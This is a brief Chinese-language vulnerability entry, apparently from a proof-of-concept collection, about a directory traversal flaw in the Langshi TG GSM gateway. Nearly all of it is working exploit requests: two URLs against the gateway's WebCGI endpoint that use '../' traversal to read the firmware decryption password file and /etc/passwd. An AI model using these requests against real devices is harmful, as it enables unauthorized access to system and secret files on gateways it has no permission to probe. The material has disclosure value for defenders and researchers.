### 描述
朗视 TG GSM ⽹关存在⽬录遍历漏洞

### POC & EXP
```
# 获取固件解密密码
http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect

# 查看/etc/passwd：
http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd
```
